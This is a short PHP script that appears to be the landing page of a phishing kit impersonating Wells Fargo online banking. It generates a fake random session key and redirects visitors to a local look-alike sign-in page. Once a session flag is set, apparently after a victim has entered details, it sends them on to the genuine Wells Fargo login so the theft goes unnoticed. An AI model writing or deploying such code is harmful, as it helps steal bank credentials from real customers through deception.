<?php
error_reporting(0);
session_start();

if (isset($_SESSION['doe'])) {
    echo "<META HTTP-EQUIV='refresh' content='0; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&&destination=AccountSummary?error=&appIdKey=".$_SESSION['key']."&country=US'>";
    exit();
}
function generateRandomString($length = 26) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
$_SESSION['key'] = generateRandomString();

echo "<META HTTP-EQUIV='refresh' content='0; URL=./session/signin.php?error=&appIdKey=".$_SESSION['key']."&country=US'>";
exit();